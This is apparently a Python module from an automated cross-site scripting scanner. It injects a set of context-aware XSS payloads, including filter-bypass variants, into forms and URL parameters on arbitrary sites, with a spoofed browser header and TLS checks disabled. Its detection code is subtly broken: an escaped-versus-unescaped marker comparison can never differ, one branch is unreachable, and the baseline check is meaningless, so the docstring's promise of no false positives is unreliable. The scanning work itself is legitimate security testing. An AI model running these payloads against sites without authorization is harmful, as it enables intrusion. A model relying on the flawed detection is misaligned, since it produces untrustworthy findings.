"""
XSS Scanner - Production Grade
Techniques: Reflected, Stored indicators, DOM-based patterns, Context-aware
Uses unique per-test markers to eliminate false positives completely.
"""
import requests, time, re, uuid, html
from urllib.parse import urlparse, parse_qs

HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
}

def make_marker():
    return "VX" + uuid.uuid4().hex[:12].upper()

def get_payloads(mk):
    """Context-aware payloads targeting different injection points."""
    return [
        # HTML context — tag injection
        (f"<script>/*{mk}*/alert(1)</script>",     "html_script"),
        (f"<img src=x onerror='/*{mk}*/alert(1)'>",'html_img'),
        (f"<svg><script>/*{mk}*/alert(1)</script>","html_svg"),
        # Attribute context — break out of attribute
        (f'"><script>/*{mk}*/alert(1)</script>',   "attr_dq_break"),
        (f"'><script>/*{mk}*/alert(1)</script>",   "attr_sq_break"),
        (f'" onmouseover="/*{mk}*/alert(1)" x="',  "attr_event"),
        # JavaScript context — break out of string
        (f"'-alert(/*{mk}*/1)-'",                  "js_sq_break"),
        (f'"-alert(/*{mk}*/1)-"',                  "js_dq_break"),
        # URL context
        (f"javascript:/*{mk}*/alert(1)",            "url_js"),
        # Filter bypass
        (f"<ScRiPt>/*{mk}*/alert(1)</ScRiPt>",    "case_bypass"),
        (f"<script/*{mk}*/>alert(1)</script>",     "space_bypass"),
        (f"<details open ontoggle='/*{mk}*/alert(1)'>", "html5_details"),
        (f"<body onload='/*{mk}*/alert(1)'>",      "body_onload"),
    ]

def detect_xss(response_text, marker):
    """
    Multi-context XSS detection using unique marker.
    Returns (is_vulnerable, context, confidence)
    """
    if marker not in response_text:
        return False, None, 0

    text = response_text
    idx  = text.find(marker)

    # Context 1: Inside <script> tag — highest confidence
    script_blocks = re.findall(r'<script[^>]*>(.*?)</script>', text, re.I|re.S)
    for block in script_blocks:
        if marker in block:
            return True, "Inside <script> block", 100

    # Context 2: Inside event handler attribute — high confidence
    event_pattern = re.compile(
        r'on\w+\s*=\s*["\'][^"\']*' + re.escape(marker), re.I)
    if event_pattern.search(text):
        return True, "Inside event handler attribute", 95

    # Context 3: Unencoded in HTML — high confidence
    # Check if marker appears unencoded (not &lt; encoded)
    encoded = html.escape(marker)
    if marker in text and encoded not in text:
        # Appears unencoded
        surrounding = text[max(0,idx-50):idx+50]
        if '<' in surrounding or '>' in surrounding:
            return True, "Unencoded in HTML context", 90

    # Context 4: javascript: URI
    if f"javascript:" in text[max(0,idx-30):idx]:
        return True, "In javascript: URI", 88

    # Context 5: Inside HTML tag attributes (not event handlers)
    attr_pattern = re.compile(
        r'<\w+[^>]*' + re.escape(marker), re.I)
    if attr_pattern.search(text):
        # Check if it broke out of attribute value
        surrounding = text[max(0,idx-20):idx+20]
        if '>' in surrounding[20:] and '<' not in surrounding[20:]:
            return True, "Broke out of HTML attribute", 85

    # Context 6: Reflected but HTML-encoded — NOT vulnerable
    if html.escape(marker) in text:
        return False, "HTML-encoded (safe)", 0

    # Marker present but context unclear — medium confidence
    return True, "Reflected in response", 70

def req(method, url, data=None, params=None, timeout=8, session_headers=None):
    try:
        hdrs = {**HEADERS, **(session_headers or {})}
        kw = dict(headers=hdrs, timeout=timeout, verify=False, allow_redirects=True)
        if method == "POST":
            return requests.post(url, data=data, **kw)
        return requests.get(url, params=params or data, **kw)
    except:
        return None

def test_xss(method, url, base_data, param, session_headers=None):
    findings = []
    marker = make_marker()
    payloads = get_payloads(marker)

    # Get baseline to check if marker appears without injection
    baseline_r = req(method, url,
                     data=base_data if method=="POST" else None,
                     params=base_data if method=="GET" else None)
    if baseline_r and marker in baseline_r.text:
        return findings  # marker already in response — skip

    for payload, ptype in payloads:
        d = base_data.copy()
        d[param] = payload
        r = req(method, url,
                data=d if method=="POST" else None,
                params=d if method=="GET" else None)
        if not r:
            time.sleep(0.05)
            continue

        vuln, context, confidence = detect_xss(r.text, marker)
        if vuln and confidence >= 70:
            findings.append({
                "vuln_type":      "Cross-Site Scripting (XSS)",
                "url":            url,
                "parameter":      param,
                "payload":        payload,
                "severity":       "High" if confidence >= 90 else "Medium",
                "description":    (
                    f"Reflected XSS in param '{param}' via {method}. "
                    f"Context: {context}. Confidence: {confidence}%. "
                    f"Payload type: {ptype}."
                ),
                "recommendation": (
                    "1. HTML-encode all user output using htmlspecialchars() or templating engine escaping. "
                    "2. Implement strict Content-Security-Policy header. "
                    "3. Use HTTPOnly and Secure flags on session cookies. "
                    "4. Validate and sanitise input server-side."
                )
            })
            return findings  # one confirmed finding per param

        time.sleep(0.05)
    return findings

def scan_form(form, page_url, session_headers=None):
    findings = []
    action = form.get("action") or page_url
    method = form.get("method","GET").upper()
    inputs = [i for i in form.get("inputs",[])
              if i.get("name") and i.get("type","text") not in
              ["submit","button","image","file","hidden","reset","password"]]
    if not inputs: return findings

    base = {i["name"]: i.get("value") or "test" for i in form.get("inputs",[]) if i.get("name")}
    for inp in inputs[:6]:
        for f in test_xss(method, action, base, inp["name"], session_headers):
            findings.append(f)
            break
    return findings

def scan_url(url, session_headers=None):
    parsed = urlparse(url)
    qs = {k: v[0] for k,v in parse_qs(parsed.query).items()}
    if not qs: return []
    base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
    findings = []
    for param in list(qs.keys())[:6]:
        for f in test_xss("GET", base_url, qs, param, session_headers):
            findings.append(f)
            break
    return findings

def run_xss_scan(crawl_data, session_headers=None):
    findings, seen = [], set()
    for page in crawl_data:
        for form in page.get("forms",[]):
            for f in scan_form(form, page["url"], session_headers):
                key = f"{f['url']}:{f['parameter']}"
                if key not in seen:
                    seen.add(key); findings.append(f)
        if page.get("params"):
            for f in scan_url(page["url"], session_headers):
                key = f"{page['url']}:{f['parameter']}"
                if key not in seen:
                    seen.add(key); findings.append(f)
    return findings
